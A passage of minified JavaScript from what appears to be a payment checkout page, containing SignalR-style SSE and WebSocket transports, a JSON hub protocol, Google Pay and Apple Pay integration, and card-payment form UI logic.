				this.isAborted || (this.isAborted = !0, this.onabort && this.onabort())
			}, Object.defineProperty(n.prototype, "signal", {
				get: function() {
					return this
				},
				enumerable: !0,
				configurable: !0
			}), Object.defineProperty(n.prototype, "aborted", {
				get: function() {
					return this.isAborted
				},
				enumerable: !0,
				configurable: !0
			}), n
		}()
	}, function(n, t, i) {
		"use strict";
		i.r(t);
		i.d(t, "ServerSentEventsTransport", function() {
			return s
		});
		var u = i(8),
			f = i(17),
			r = i(12),
			e = undefined && undefined.__awaiter || function(n, t, i, r) {
				return new(i || (i = Promise))(function(u, f) {
					function o(n) {
						try {
							e(r.next(n))
						} catch (t) {
							f(t)
						}
					}

					function s(n) {
						try {
							e(r["throw"](n))
						} catch (t) {
							f(t)
						}
					}

					function e(n) {
						n.done ? u(n.value) : new i(function(t) {
							t(n.value)
						}).then(o, s)
					}
					e((r = r.apply(n, t || [])).next())
				})
			},
			o = undefined && undefined.__generator || function(n, t) {
				function o(n) {
					return function(t) {
						return s([n, t])
					}
				}

				function s(e) {
					if (f) throw new TypeError("Generator is already executing.");
					while (r) try {
						if (f = 1, u && (i = e[0] & 2 ? u["return"] : e[0] ? u["throw"] || ((i = u["return"]) && i.call(u), 0) : u.next) && !(i = i.call(u, e[1])).done) return i;
						(u = 0, i) && (e = [e[0] & 2, i.value]);
						switch (e[0]) {
							case 0:
							case 1:
								i = e;
								break;
							case 4:
								return r.label++, {
									value: e[1],
									done: !1
								};
							case 5:
								r.label++;
								u = e[1];
								e = [0];
								continue;
							case 7:
								e = r.ops.pop();
								r.trys.pop();
								continue;
							default:
								if (!(i = r.trys, i = i.length > 0 && i[i.length - 1]) && (e[0] === 6 || e[0] === 2)) {
									r = 0;
									continue
								}
								if (e[0] === 3 && (!i || e[1] > i[0] && e[1] < i[3])) {
									r.label = e[1];
									break
								}
								if (e[0] === 6 && r.label < i[1]) {
									r.label = i[1];
									i = e;
									break
								}
								if (i && r.label < i[2]) {
									r.label = i[2];
									r.ops.push(e);
									break
								}
								i[2] && r.ops.pop();
								r.trys.pop();
								continue
						}
						e = t.call(n, r)
					} catch (o) {
						e = [6, o];
						u = 0
					} finally {
						f = i = 0
					}
					if (e[0] & 5) throw e[1];
					return {
						value: e[0] ? e[1] : void 0,
						done: !0
					}
				}
				var r = {
						label: 0,
						sent: function() {
							if (i[0] & 1) throw i[1];
							return i[1]
						},
						trys: [],
						ops: []
					},
					f, u, i, e;
				return e = {
					next: o(0),
					"throw": o(1),
					"return": o(2)
				}, typeof Symbol == "function" && (e[Symbol.iterator] = function() {
					return this
				}), e
			},
			s = function() {
				function n(n, t, i, r, u) {
					this.httpClient = n;
					this.accessTokenFactory = t;
					this.logger = i;
					this.logMessageContent = r;
					this.eventSourceConstructor = u;
					this.onreceive = null;
					this.onclose = null
				}
				return n.prototype.connect = function(n, t) {
					return e(this, void 0, void 0, function() {
						var e, i = this;
						return o(this, function(o) {
							switch (o.label) {
								case 0:
									return (r.Arg.isRequired(n, "url"), r.Arg.isRequired(t, "transferFormat"), r.Arg.isIn(t, f.TransferFormat, "transferFormat"), this.logger.log(u.LogLevel.Trace, "(SSE transport) Connecting."), this.url = n, !this.accessTokenFactory) ? [3, 2] : [4, this.accessTokenFactory()];
								case 1:
									e = o.sent();
									e && (n += (n.indexOf("?") < 0 ? "?" : "&") + ("access_token=" + encodeURIComponent(e)));
									o.label = 2;
								case 2:
									return [2, new Promise(function(e, o) {
										var h = !1,
											s, c;
										if (t !== f.TransferFormat.Text) {
											o(new Error("The Server-Sent Events transport only supports the 'Text' transfer format"));
											return
										}
										typeof window != "undefined" ? s = new i.eventSourceConstructor(n, {
											withCredentials: !0
										}) : (c = i.httpClient.getCookieString(n), s = new i.eventSourceConstructor(n, {
											withCredentials: !0,
											headers: {
												Cookie: c
											}
										}));
										try {
											s.onmessage = function(n) {
												if (i.onreceive) try {
													i.logger.log(u.LogLevel.Trace, "(SSE transport) data received. " + Object(r.getDataDetail)(n.data, i.logMessageContent) + ".");
													i.onreceive(n.data)
												} catch (t) {
													i.close(t);
													return
												}
											};
											s.onerror = function(n) {
												var t = new Error(n.data || "Error occurred");
												h ? i.close(t) : o(t)
											};
											s.onopen = function() {
												i.logger.log(u.LogLevel.Information, "SSE connected to " + i.url);
												i.eventSource = s;
												h = !0;
												e()
											}
										} catch (l) {
											o(l);
											return
										}
									})]
							}
						})
					})
				}, n.prototype.send = function(n) {
					return e(this, void 0, void 0, function() {
						return o(this, function() {
							return this.eventSource ? [2, Object(r.sendMessage)(this.logger, "SSE", this.httpClient, this.url, this.accessTokenFactory, n, this.logMessageContent)] : [2, Promise.reject(new Error("Cannot send until the transport is connected"))]
						})
					})
				}, n.prototype.stop = function() {
					return this.close(), Promise.resolve()
				}, n.prototype.close = function(n) {
					if (this.eventSource && (this.eventSource.close(), this.eventSource = undefined, this.onclose)) this.onclose(n)
				}, n
			}()
	}, function(n, t, i) {
		"use strict";
		i.r(t);
		i.d(t, "WebSocketTransport", function() {
			return s
		});
		var r = i(8),
			f = i(17),
			u = i(12),
			e = undefined && undefined.__awaiter || function(n, t, i, r) {
				return new(i || (i = Promise))(function(u, f) {
					function o(n) {
						try {
							e(r.next(n))
						} catch (t) {
							f(t)
						}
					}

					function s(n) {
						try {
							e(r["throw"](n))
						} catch (t) {
							f(t)
						}
					}

					function e(n) {
						n.done ? u(n.value) : new i(function(t) {
							t(n.value)
						}).then(o, s)
					}
					e((r = r.apply(n, t || [])).next())
				})
			},
			o = undefined && undefined.__generator || function(n, t) {
				function o(n) {
					return function(t) {
						return s([n, t])
					}
				}

				function s(e) {
					if (f) throw new TypeError("Generator is already executing.");
					while (r) try {
						if (f = 1, u && (i = e[0] & 2 ? u["return"] : e[0] ? u["throw"] || ((i = u["return"]) && i.call(u), 0) : u.next) && !(i = i.call(u, e[1])).done) return i;
						(u = 0, i) && (e = [e[0] & 2, i.value]);
						switch (e[0]) {
							case 0:
							case 1:
								i = e;
								break;
							case 4:
								return r.label++, {
									value: e[1],
									done: !1
								};
							case 5:
								r.label++;
								u = e[1];
								e = [0];
								continue;
							case 7:
								e = r.ops.pop();
								r.trys.pop();
								continue;
							default:
								if (!(i = r.trys, i = i.length > 0 && i[i.length - 1]) && (e[0] === 6 || e[0] === 2)) {
									r = 0;
									continue
								}
								if (e[0] === 3 && (!i || e[1] > i[0] && e[1] < i[3])) {
									r.label = e[1];
									break
								}
								if (e[0] === 6 && r.label < i[1]) {
									r.label = i[1];
									i = e;
									break
								}
								if (i && r.label < i[2]) {
									r.label = i[2];
									r.ops.push(e);
									break
								}
								i[2] && r.ops.pop();
								r.trys.pop();
								continue
						}
						e = t.call(n, r)
					} catch (o) {
						e = [6, o];
						u = 0
					} finally {
						f = i = 0
					}
					if (e[0] & 5) throw e[1];
					return {
						value: e[0] ? e[1] : void 0,
						done: !0
					}
				}
				var r = {
						label: 0,
						sent: function() {
							if (i[0] & 1) throw i[1];
							return i[1]
						},
						trys: [],
						ops: []
					},
					f, u, i, e;
				return e = {
					next: o(0),
					"throw": o(1),
					"return": o(2)
				}, typeof Symbol == "function" && (e[Symbol.iterator] = function() {
					return this
				}), e
			},
			s = function() {
				function n(n, t, i, r, u) {
					this.logger = i;
					this.accessTokenFactory = t;
					this.logMessageContent = r;
					this.webSocketConstructor = u;
					this.httpClient = n;
					this.onreceive = null;
					this.onclose = null
				}
				return n.prototype.connect = function(n, t) {
					return e(this, void 0, void 0, function() {
						var e, i = this;
						return o(this, function(o) {
							switch (o.label) {
								case 0:
									return (u.Arg.isRequired(n, "url"), u.Arg.isRequired(t, "transferFormat"), u.Arg.isIn(t, f.TransferFormat, "transferFormat"), this.logger.log(r.LogLevel.Trace, "(WebSockets transport) Connecting."), !this.accessTokenFactory) ? [3, 2] : [4, this.accessTokenFactory()];
								case 1:
									e = o.sent();
									e && (n += (n.indexOf("?") < 0 ? "?" : "&") + ("access_token=" + encodeURIComponent(e)));
									o.label = 2;
								case 2:
									return [2, new Promise(function(e, o) {
										n = n.replace(/^http/, "ws");
										var s, h = i.httpClient.getCookieString(n);
										typeof window == "undefined" && h && (s = new i.webSocketConstructor(n, undefined, {
											headers: {
												Cookie: "" + h
											}
										}));
										s || (s = new i.webSocketConstructor(n));
										t === f.TransferFormat.Binary && (s.binaryType = "arraybuffer");
										s.onopen = function() {
											i.logger.log(r.LogLevel.Information, "WebSocket connected to " + n + ".");
											i.webSocket = s;
											e()
										};
										s.onerror = function(n) {
											var t = null;
											typeof ErrorEvent != "undefined" && n instanceof ErrorEvent && (t = n.error);
											o(t)
										};
										s.onmessage = function(n) {
											if (i.logger.log(r.LogLevel.Trace, "(WebSockets transport) data received. " + Object(u.getDataDetail)(n.data, i.logMessageContent) + "."), i.onreceive) i.onreceive(n.data)
										};
										s.onclose = function(n) {
											return i.close(n)
										}
									})]
							}
						})
					})
				}, n.prototype.send = function(n) {
					return this.webSocket && this.webSocket.readyState === this.webSocketConstructor.OPEN ? (this.logger.log(r.LogLevel.Trace, "(WebSockets transport) sending data. " + Object(u.getDataDetail)(n, this.logMessageContent) + "."), this.webSocket.send(n), Promise.resolve()) : Promise.reject("WebSocket is not in the OPEN state")
				}, n.prototype.stop = function() {
					return this.webSocket && (this.webSocket.onclose = function() {}, this.webSocket.onmessage = function() {}, this.webSocket.onerror = function() {}, this.webSocket.close(), this.webSocket = undefined, this.close(undefined)), Promise.resolve()
				}, n.prototype.close = function(n) {
					if (this.logger.log(r.LogLevel.Trace, "(WebSockets transport) socket closed."), this.onclose)
						if (n && (n.wasClean === !1 || n.code !== 1e3)) this.onclose(new Error("WebSocket closed with status code: " + n.code + " (" + n.reason + ")."));
						else this.onclose()
				}, n
			}()
	}, function(n, t, i) {
		"use strict";
		i.r(t);
		i.d(t, "JsonHubProtocol", function() {
			return h
		});
		var r = i(14),
			f = i(8),
			e = i(17),
			o = i(13),
			u = i(11),
			s = "json",
			h = function() {
				function n() {
					this.name = s;
					this.version = 1;
					this.transferFormat = e.TransferFormat.Text
				}
				return n.prototype.parseMessages = function(n, t) {
					var c, s, e, h, l, i;
					if (typeof n != "string") throw new Error("Invalid input for JSON hub protocol. Expected a string.");
					if (!n) return [];
					for (t === null && (t = o.NullLogger.instance), c = u.TextMessageFormat.parse(n), s = [], e = 0, h = c; e < h.length; e++) {
						if (l = h[e], i = JSON.parse(l), typeof i.type != "number") throw new Error("Invalid payload.");
						switch (i.type) {
							case r.MessageType.Invocation:
								this.isInvocationMessage(i);
								break;
							case r.MessageType.StreamItem:
								this.isStreamItemMessage(i);
								break;
							case r.MessageType.Completion:
								this.isCompletionMessage(i);
								break;
							case r.MessageType.Ping:
								break;
							case r.MessageType.Close:
								break;
							default:
								t.log(f.LogLevel.Information, "Unknown message type '" + i.type + "' ignored.");
								continue
						}
						s.push(i)
					}
					return s
				}, n.prototype.writeMessage = function(n) {
					return u.TextMessageFormat.write(JSON.stringify(n))
				}, n.prototype.isInvocationMessage = function(n) {
					this.assertNotEmptyString(n.target, "Invalid payload for Invocation message.");
					n.invocationId !== undefined && this.assertNotEmptyString(n.invocationId, "Invalid payload for Invocation message.")
				}, n.prototype.isStreamItemMessage = function(n) {
					if (this.assertNotEmptyString(n.invocationId, "Invalid payload for StreamItem message."), n.item === undefined) throw new Error("Invalid payload for StreamItem message.");
				}, n.prototype.isCompletionMessage = function(n) {
					if (n.result && n.error) throw new Error("Invalid payload for Completion message.");
					!n.result && n.error && this.assertNotEmptyString(n.error, "Invalid payload for Completion message.");
					this.assertNotEmptyString(n.invocationId, "Invalid payload for Completion message.")
				}, n.prototype.assertNotEmptyString = function(n, t) {
					if (typeof n != "string" || n === "") throw new Error(t);
				}, n
			}()
	}])
}),
function(n) {
	function u() {
		return Object.assign({}, i, {
			allowedPaymentMethods: [r]
		})
	}
	var t = {},
		i = {
			apiVersion: 2,
			apiVersionMinor: 0
		},
		r = {
			type: "CARD",
			parameters: {
				allowedAuthMethods: ["CRYPTOGRAM_3DS"],
				allowedCardNetworks: ["MASTERCARD", "VISA"]
			}
		};
	typeof require != "undefined" && typeof exports != "undefined" && typeof module != "undefined" ? module.exports = t : n.GooglePay = t;
	t.Configure = function(t, f) {
		var o;
		if (!n.ApplePaySession && (o = document.getElementsByClassName("googlepay-container"), o.length !== 0)) {
			var s = new google.payments.api.PaymentsClient({
					environment: "TEST"
				}),
				e = o[0],
				h = e.getAttribute("data-merchant-id"),
				c = e.getAttribute("data-merchant-name"),
				l = function() {
					return Object.assign({}, r, {
						tokenizationSpecification: {
							type: "PAYMENT_GATEWAY",
							parameters: {
								gateway: "paymaster",
								gatewayMerchantId: h
							}
						}
					})
				},
				a = function() {
					var n = Object.assign({}, i);
					return n.allowedPaymentMethods = [l()], n.emailRequired = t.emailRequired, n.transactionInfo = {
						currencyCode: t.currencyCode,
						totalPriceStatus: "FINAL",
						totalPrice: t.totalAmount
					}, n.merchantInfo = {
						merchantName: c
					}, n
				},
				v = function() {
					var n = a();
					s.loadPaymentData(n).then(function(n) {
						f({
							email: n.email,
							token: n.paymentMethodData
						})
					}).catch(function(n) {
						console.error(n)
					})
				};
			s.isReadyToPay(u()).then(function(n) {
				if (n.result) {
					var t = s.createButton({
							onClick: v,
							buttonColor: "black",
							buttonType: "long"
						}),
						i = t.getElementsByTagName("button")[0];
					i.setAttribute("type", "button");
					e.appendChild(t);
					e.parentNode.getElementsByClassName("or")[0].classList.remove("hidden")
				}
			}).catch(function(n) {
				console.error(n)
			})
		}
	}
}(this),
function(n) {
	var i = 0,
		t = {};
	typeof require != "undefined" && typeof exports != "undefined" && typeof module != "undefined" ? module.exports = t : n.ApplePay = t;
	t.Configure = function(t, r) {
		var f;
		if (n.ApplePaySession && (f = document.getElementsByClassName("applepay-container"), f.length !== 0)) {
			var u = f[0],
				e = u.getAttribute("data-merchant-id"),
				o = u.getAttribute("data-merchant-name"),
				s = function(n) {
					var t = {
						token: n.payment.token
					};
					n.payment.shippingContact && (t.email = n.payment.shippingContact.emailAddress);
					r(t)
				},
				h = function() {
					var r = {
							supportedNetworks: ["visa", "masterCard"],
							merchantCapabilities: ["supports3DS"],
							countryCode: t.countryCode,
							currencyCode: t.currencyCode,
							total: {
								label: o,
								amount: t.totalAmount
							}
						},
						n;
					t.emailRequired && (r.requiredShippingContactFields = ["email"]);
					n = new ApplePaySession(3, r);
					n.onvalidatemerchant = function(t) {
						l(n, t.validationURL)
					};
					n.onpaymentauthorized = function(t) {
						s(t);
						n.completePayment({
							status: i
						})
					};
					n.begin()
				},
				c = function() {
					var n = document.createElement("div"),
						i, r;
					n.classList.add("apple-pay-button-with-text");
					n.classList.add("apple-pay-button-black-with-text");
					n.setAttribute("lang", t.culture);
					n.addEventListener("click", function(n) {
						n.preventDefault();
						h()
					});
					i = document.createElement("span");
					i.classList.add("text");
					i.innerHTML = "Оплатить через";
					n.appendChild(i);
					r = document.createElement("span");
					r.classList.add("logo");
					n.appendChild(r);
					u.appendChild(n);
					u.parentNode.getElementsByClassName("or")[0].classList.remove("hidden")
				},
				l = function(n, i) {
					var r = {
						paymentId: t.paymentUniqueId,
						validateUrl: i
					};
					$.ajax("/applepay/session", {
						contentType: "application/json",
						data: JSON.stringify(r),
						cache: !1,
						timeout: 5e3,
						dataType: "json",
						method: "POST"
					}).done(function(t) {
						n.completeMerchantValidation(t)
					}).fail(function(n) {
						console.error(n)
					})
				};
			n.ApplePaySession.canMakePaymentsWithActiveCard(e).then(function(n) {
				n && c(u)
			}).catch(function(n) {
				console.error(n)
			})
		}
	}
}(this),
function(n) {
	function l(t) {
		t.culture.code === "ru" ? Globalize.culture("ru-RU") : Globalize.culture("en-US");
		$.validator.addMethod("money", function(n, t, i) {
			return this.optional(t) || /^\d+([\.,]\d{1,2})?$/.test(n) && Globalize.parseFloat(n) <= i
		});
		var r = new s,
			u = new o(t, r),
			f = new c(t, u, r),
			i = new h(t, f, r);
		i.setRedirectToMerchantDefaultHandler();
		i.initializePaymentOptions();
		i.enablePsSelectorClick();
		i.initializeInputMasks();
		i.initializeSelectBox();
		i.initializeModals();
		i.initializeTooltips();
		i.initializeNotificationBox();
		i.initializeCancelButton();
		i.initializeAmount();
		i.initializeCardControls();
		i.initializeTokenBasedPaymentMethods();
		t.newPayment ? t.requisites.method === null ? r.showPaymentOptionsShowcase() : i.switchPaymentMethod(t.requisites.method) || u.showPaymentForm() : (i.setPaymentMethod(t.requisites.method), u.loadCurrentState());
		n.ApplePay && n.ApplePay.Configure({
			culture: t.culture.code,
			emailRequired: t.requisites.email.required,
			paymentUniqueId: t.payment.id,
			countryCode: "RU",
			currencyCode: t.payment.currency,
			totalAmount: t.payment.amount.toString()
		}, function(n) {
			f.submitApplePayToken(n)
		});
		n.GooglePay && n.GooglePay.Configure({
			emailRequired: t.requisites.email.required,
			paymentUniqueId: t.payment.id,
			currencyCode: t.payment.currency,
			totalAmount: t.payment.amount.toString()
		}, function(n) {
			f.submitGooglePayToken(n)
		})
	}
	var t = {
			Processing: "Processing",
			Finished: "Finished",
			Authorized: "Authorized",
			Failed: "Failed",
			Cancelled: "Cancelled",
			UserInputRequired: "UserInputRequired"
		},
		r = {
			Info: "Info",
			Redirect: "Redirect",
			Error: "Error",
			FatalError: "FatalError",
			TrackPayment: "TrackPayment",
			PaymentCancelled: "Cancel",
			UserInputRequired: "UserInputRequired"
		},
		u = {
			None: "None",
			Pending: "Pending",
			Authorized: "Authorized",
			ConfirmationRequired: "ConfirmationRequired",
			Rejected: "Rejected",
			Failed: "Failed",
			Error: "Error"
		},
		f = {
			ThreeDSecure: "ThreeDSecure",
			SmsOtp: "SmsOtp",
			External: "External",
			PaymentUrl: "PaymentUrl",
			ThreeDSMethod: "ThreeDSMethod"
		},
		e = {
			Default: "Default",
			AutoSubmit: "Auto",
			Immediate: "Immediate"
		},
		i = {
			Empty: "Empty",
			External: "External",
			Card: "Card"
		},
		o = function(n, i) {
			var h = new HttpRequestUtils,
				s = "payments",
				u = this,
				f, o;
			if (n.hub && n.hub.hubUrl) {
				o = 1e4;
				f = new AppHub;
				f.build({
					hubUrl: n.hub.hubUrl,
					appId: n.hub.appId,
					subscriberId: n.payment.id,
					reconnectMillisecondTimeout: o
				});
				f.on("PAYMENTUPDATE", function() {
					u.pullPaymentStatus()
				});
				f.callbackConnectionLaid = function(n) {
					n.isReconnect && u.pullPaymentStatus()
				}
			}
			this.callWithDelay = function(n, t) {
				t || (t = 3e3);
				setTimeout(n, t)
			};
			this.showSuccessMessage = function(n, t) {
				i.renderMessage("pp-success", n, t)
			};
			this.showFailedMessage = function(n, t) {
				i.renderErrorMessage(n, t)
			};
			this.showPendingMessage = function(n, t) {
				i.renderPendingMessage(t)
			};
			this.showCancelledText = function(n, t) {
				i.renderWarnMessage(n, t)
			};
			this.showPaymentForm = function() {
				i.showPaymentForm();
				i.showCancelButton();
				i.showProceedButton();
				i.clearCurrentMessage();
				i.hideRedirectToMerchantButton()
			};
			this.loadCurrentState = function() {
				i.hidePaymentForm();
				i.hideCancelButton();
				i.hideProceedButton();
				i.hideRedirectToMerchantButton();
				i.renderLoader();
				setTimeout(function() {
					i.makeFormReadOnly();
					u.pullPaymentStatus()
				}, 500)
			};
			this.handlePaymentStatusResponse = function(n) {
				var f;
				if (!n) {
					i.renderErrorMessage(locale.get("error"), locale.get("unavailable"));
					return
				}
				if (n.payment && (f = {
						payment: n.payment
					}, i.applyOptions(f)), n.status === t.Processing) {
					i.showPaymentMethod();
					i.hidePaymentForm();
					i.hideCancelButton();
					i.hideProceedButton();
					i.hideRedirectToMerchantButton();
					n.type === r.Info ? i.renderPointMessage(n.title, n.messageBody) : u.showPendingMessage(n.title, n.messageBody);
					u.callWithDelay(u.pullPaymentStatus);
					return
				}
				if (n.status === t.UserInputRequired) {
					f = {
						requireAmount: !n.payment.amount
					};
					i.openRequisiteForm();
					u.showPaymentForm(f);
					n.messageBody && u.showFailedMessage(n.title, n.messageBody);
					return
				}
				i.hidePaymentForm();
				i.hideCancelButton();
				i.hideProceedButton();
				i.setRedirectToMerchantHandler(n.httpMethod, n.redirectUrl, n.postParams);
				(n.status === t.Finished || n.status === t.Authorized) && (u.showSuccessMessage(n.title, n.messageBody), n.status === t.Finished && i.showReceiptButton(), n.redirectMode === e.AutoSubmit ? i.renderRedirectToMerchantWithTimer() : n.redirectMode === e.Immediate && i.renderRedirectToMerchantWithDelay());
				n.status === t.Failed && (u.showFailedMessage(n.title, n.messageBody), i.hideReceiptButton());
				n.status === t.Cancelled && (u.showCancelledText(n.title, n.messageBody), i.hideReceiptButton());
				i.showRedirectToMerchantButton()
			};
			this.subscribeToNotification = function() {
				f && f.subscribe()
			};
			this.pullPaymentStatus = function() {
				var t = urlUtils.createFromTemplate("{controller}/{action}/{id}", {
					controller: s,
					action: "status",
					id: n.payment.id
				});
				$.ajax(t, {
					contentType: "application/json",
					cache: !1,
					timeout: 5e3,
					dataType: "json",
					method: "GET"
				}).done(u.handlePaymentStatusResponse).fail(function() {
					u.callWithDelay(u.pullPaymentStatus)
				})
			}
		},
		s = function() {
			function g() {
				return {
					number: $("#cardNumber"),
					expireYear: $("#cardExpirationYear"),
					expireMonth: $("#cardExpirationMonth"),
					holder: $("#cardHolder"),
					cvc: $("#cardCVC"),
					saveCard: $("#saveCard")
				}
			}
			var t = this,
				nt = new HttpRequestUtils,
				tt = 1e4,
				w = $("#receipt"),
				u = $("#messageContainer"),
				f = $("#returnToMerchant"),
				r = $("#payment_requisites_form"),
				b = $(".payment-form-controls"),
				o = $("#cancel"),
				e = $("#proceed"),
				ft = $("#paymentMethodContainer"),
				it = $("input[name='notificationSink']"),
				s = $(".token-based-payment-buttons"),
				k = $("#requisites"),
				rt = $("#requisites .sum"),
				ut = r.find("div.card-form-block"),
				h = $("div.payment-method-block"),
				a = r.find("div.payment-data-block"),
				d = r.find("div.payment-amount-block"),
				v = r.find("div.notification-block"),
				c = r.find("div.confirmation-block"),
				y, l = "card",
				p = !1;
			this.isConfirmationMode = function() {
				return p
			};
			this.toggleDisabled = function(n, i) {
				i ? t.disableElement(n) : t.enableElement(n)
			};
			this.setPaymentForm = function(n) {
				ut.toggleClass("hidden", n !== i.Card);
				t.openRequisiteForm()
			};
			this.setPaymentMethod = function(n) {
				y = n;
				$(".choose-payment-method").addClass("hidden");
				var t = $(".active-payment-method"),
					i = t.find("div > img"),
					r = t.find("p");
				i.attr("src", n.logo);
				r.html(n.name);
				t.removeClass("hidden")
			};
			this.togglePaymentMethodChange = function(n) {
				$(".more-payment-methods").toggleClass("hidden", !n)
			};
			this.showPaymentOptionsShowcase = function() {
				var n = $(".payment-options-bricks");
				n.find(".choose-payment-method").removeClass("hidden");
				n.find(".more-payment-methods").addClass("hidden");
				n.find(".other-payment-methods").show();
				t.showPaymentForm();
				t.showCancelButton();
				t.hideProceedButton()
			};
			this.disableElement = function(n) {
				n.attr("data-disabled", "true");
				n.attr("disabled", "disabled")
			};
			this.enableElement = function(n) {
				n.removeAttr("data-disabled");
				n.removeAttr("disabled")
			};
			this.switchNotification = function(n) {
				t.toggleDisabled(it, n)
			};
			this.makeFormReadOnly = function() {
				r.find("input,select").attr("disabled", "disabled");
				s.find("button").attr("disabled", "disabled");
				o.attr("disabled", "disabled");
				e.attr("disabled", "disabled")
			};
			this.makeFormEditable = function() {
				r.find("[data-disabled!='true']").removeAttr("disabled");
				s.find("button").removeAttr("disabled");
				o.removeAttr("disabled");
				e.removeAttr("disabled")
			};
			this.openRequisiteForm = function() {
				p = !1;
				t.toggleDisabled(c.find("#confirmationCode"), !0);
				c.addClass("hidden");
				a.removeClass("hidden");
				v.removeClass("hidden");
				e.removeClass("hidden");
				t.makeFormEditable()
			};
			this.showConfirmationBlock = function(n) {
				var r, u, i;
				p = !0;
				n && (r = locale.get("confirmationRequired"), u = locale.get("smsOtpConfirmationText").replace("{{phone}}", n), t.renderWarnMessage(r, u));
				i = c.find("#confirmationCode");
				t.toggleDisabled(i, !1);
				a.addClass("hidden");
				v.addClass("hidden");
				c.removeClass("hidden");
				i.val(null);
				i.focus();
				o.removeAttr("disabled");
				e.removeAttr("disabled")
			};
			this.showUniversalPaymentUrl = function(n, i) {
				var f, u, e, r;
				h.addClass("hidden");
				a.addClass("hidden");
				v.addClass("hidden");
				t.hideCancelButton();
				t.hideProceedButton();
				i || (f = locale.get("scanCode"));
				y && (u = y.logo);
				e = (i || locale.get("paymentLinkText")).replace(/\{\{paymentUrl\}\}/g, n);
				r = "<div class='qrcode'>";
				r += "<div class='qrcode-data'>";
				u && (r += "<div class='qrcode-logo'><img src='" + u + "'><\/div>");
				r += "<\/div>";
				r += "<div class='qrcode-text'>" + marked(e) + "<\/div>";
				r += "<\/div>";
				t.renderInfoMessage(f, r);
				new QRCode(document.querySelector(".qrcode-data"), n)
			};
			this.switchTokenPaymentMode = function(n) {
				var i = g();
				l !== "token" && (l = "token", i.number.attr("readonly", "readonly"), t.toggleDisabled(i.expireYear.add(i.expireMonth).add(i.holder).add(i.saveCard), !0), i.expireYear.val("●●"), i.expireMonth.val("●●"), i.holder.val("●●●●●●●●●●●●"), i.saveCard.removeAttr("checked"));
				i.number.val(n).valid();
				i.cvc.val("")
			};
			this.switchCardPaymentMode = function() {
				var n = g();
				l !== "card" && (l = "card", n.number.removeAttr("readonly"), t.toggleDisabled(n.expireYear.add(n.expireMonth).add(n.holder).add(n.saveCard), !1), n.number.add(n.expireYear).add(n.expireMonth).add(n.holder).add(n.cvc).val(""))
			};
			this.hidePaymentForm = function() {
				b.addClass("hidden");
				s.addClass("hidden");
				t.hidePaymentMethod()
			};
			this.showPaymentForm = function() {
				b.removeClass("hidden");
				s.removeClass("hidden");
				t.showPaymentMethod()
			};
			this.showPaymentMethod = function() {
				h.removeClass("hidden")
			};
			this.hidePaymentMethod = function() {
				h.addClass("hidden")
			};
			this.showProceedButton = function() {
				e.removeClass("hidden")
			};
			this.hideProceedButton = function() {
				e.addClass("hidden")
			};
			this.showCancelButton = function() {
				o.removeClass("hidden")
			};
			this.hideCancelButton = function() {
				o.addClass("hidden")
			};
			this.showReceiptButton = function() {
				w.removeClass("hidden")
			};
			this.hideReceiptButton = function() {
				w.addClass("hidden")
			};
			this.applyOptions = function(n) {
				if (n && n.payment)
					if (n.payment.amount) {
						var t = Globalize.format(n.payment.amount) + " " + n.payment.currency;
						rt.html(t);
						$("input.payment-amount").attr("disabled", "disabled");
						d.addClass("hidden");
						k.removeClass("hidden")
					} else $("input.payment-amount").removeAttr("disabled"), d.removeClass("hidden"), k.addClass("hidden")
			};
			this.showRedirectToMerchantButton = function() {
				f.removeClass("hidden")
			};
			this.hideRedirectToMerchantButton = function() {
				f.addClass("hidden")
			};
			this.renderRedirectToMerchantWithDelay = function() {
				n.setTimeout(function() {
					f.click()
				}, 1e3)
			};
			this.renderRedirectToMerchantWithTimer = function() {
				function i() {
					var t = this;
					this.seconds = 0;
					this.timeToMiddle = 0;
					this.count = 0;
					this.degrees = 0;
					this.increment = 0;
					this.interval = null;
					this.timerHTML = "<div class='ghost'><\/div><div class='n'><\/div><div class='slice'><div class='q'><\/div><div class='pie r'><\/div><div class='pie l'><\/div><\/div>";
					this.timerContainer = null;
					this.number = null;
					this.slice = null;
					this.pie = null;
					this.pieRight = null;
					this.pieLeft = null;
					this.init = function(n, i) {
						t.timerContainer = $("#" + n);
						t.timerContainer.html(t.timerHTML);
						t.number = t.timerContainer.find(".n");
						t.slice = t.timerContainer.find(".slice");
						t.pie = t.timerContainer.find(".pie");
						t.pieRight = t.timerContainer.find(".pie.r");
						t.pieLeft = t.timerContainer.find(".pie.l");
						t.start(i)
					};
					this.start = function(i) {
						t.seconds = i;
						t.increment = 360 / t.seconds;
						t.interval = n.setInterval(function() {
							if (t.count === Math.floor(t.seconds / 2)) {
								var n = (t.seconds / 2 - t.count) * 1e3;
								setTimeout(function() {
									t.slice.addClass("c");
									t.pieLeft.hide()
								}, n)
							}
							t.degrees += t.increment;
							t.pieRight.css({
								transform: "rotate(" + t.degrees + "deg)"
							});
							t.count++;
							t.number.html(t.seconds - t.count);
							t.count >= t.seconds && (clearInterval(t.interval), f.click())
						}, 1e3)
					}
				}
				var r = $("<p/>", {
						"class": "radialtimer",
						id: "timer"
					}),
					t;
				u.find("div.pp-success").prepend(r);
				t = new i;
				t.init("timer", tt / 1e3)
			};
			this.setDefaultRedirectToMerchantHandler = function() {
				f.click(function(t) {
					t.preventDefault();
					n.location.assign($(this).attr("data-href"))
				})
			};
			this.setRedirectToMerchantHandler = function(t, i, r) {
				f.click(function(u) {
					u.preventDefault();
					t === "Get" ? n.location.assign(i) : nt.generatePostFormAndRedirect(i, r, t)
				})
			};
			this.clearCurrentMessage = function() {
				u.html("")
			};
			this.renderMessageInternal = function(n) {
				var t = $("<div>"),
					i, r, f, e, o, s;
				t.addClass("pp-message pp-clearfix " + n.cssClass);
				n.html ? t.append(marked(n.html)) : (t = $("<div>"), t.addClass("pp-message pp-clearfix " + n.cssClass), n.title && (i = $("<h3>", {}), i.html(n.title), t.append(i)), n.text && (r = $("<p>"), r.html(n.text), t.append(r)));
				n.renderLoader && (f = $("#progress-loader").html(), e = Handlebars.compile(f), t.prepend(e));
				u.html("");
				u.append(t);
				n.additionalMessageHtml && (o = $("<p>").append(n.additionalMessageHtml), s = $("<div>").addClass("pp-message pp-clearfix pp-warning").append(o), u.append(s))
			};
			this.renderMessage = function(n, i, r) {
				var u = {
					cssClass: n
				};
				i ? (u.title = i, u.text = r) : u.html = r;
				t.renderMessageInternal(u)
			};
			this.renderInfoMessage = function(n, i) {
				t.renderMessage("pp-info", n, i)
			};
			this.renderErrorMessage = function(n, i, r) {
				t.renderMessage("pp-error", n, i);
				r && u[0].scrollIntoView()
			};
